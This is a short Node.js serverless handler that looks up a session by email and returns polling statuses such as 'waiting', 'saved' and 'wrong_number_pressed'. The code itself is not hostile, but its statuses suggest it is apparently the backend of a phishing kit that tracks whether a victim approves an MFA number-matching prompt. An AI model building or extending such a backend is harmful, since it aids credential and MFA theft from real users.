const { getSessionByEmail } = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');

  let email = req.body?.em || req.query?.em || '';
  if (!email && typeof req.body === 'string') {
    try {
      const parsed = JSON.parse(req.body);
      email = parsed.em || '';
    } catch (e) {}
  }

  if (!email) return res.status(200).send('waiting');

  const session = getSessionByEmail(email);
  if (!session) return res.status(200).send('waiting');

  const status = session.status || 'pending';
  if (status === 'saved' || status === 'approved') {
    return res.status(200).send('saved');
  } else if (status === 'wrong_number_pressed') {
    return res.status(200).send('wrong_number_pressed');
  } else {
    return res.status(200).send('waiting');
  }
};
